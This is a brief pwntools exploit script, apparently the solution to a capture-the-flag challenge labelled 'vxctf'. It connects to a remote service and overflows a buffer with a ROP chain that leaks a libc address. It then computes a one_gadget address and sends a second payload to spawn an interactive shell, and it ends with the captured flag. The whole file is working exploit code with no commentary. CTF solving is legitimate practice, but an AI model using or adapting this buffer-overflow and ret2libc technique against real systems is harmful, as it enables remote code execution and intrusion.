from pwn import *

payload = "A" * 120 + p64(0x4006a3) + p64(0x601018) + p64(0x4004b0) * 2

r = remote('35.185.151.73', 8044)
r.recvuntil('Sanity Check should be easy')
r.recvline()
r.sendline(payload)

a =  u64(r.recvline()[:-1].ljust(8, "\x00"))
print (hex(a))

base = a - 0x6f690
one = base + 0x45216

r.sendline(p64(0x40061e) * 2 + p64(one) * 130)
r.interactive()

# vxctf{enjoy_the_game_prepared_by_us}
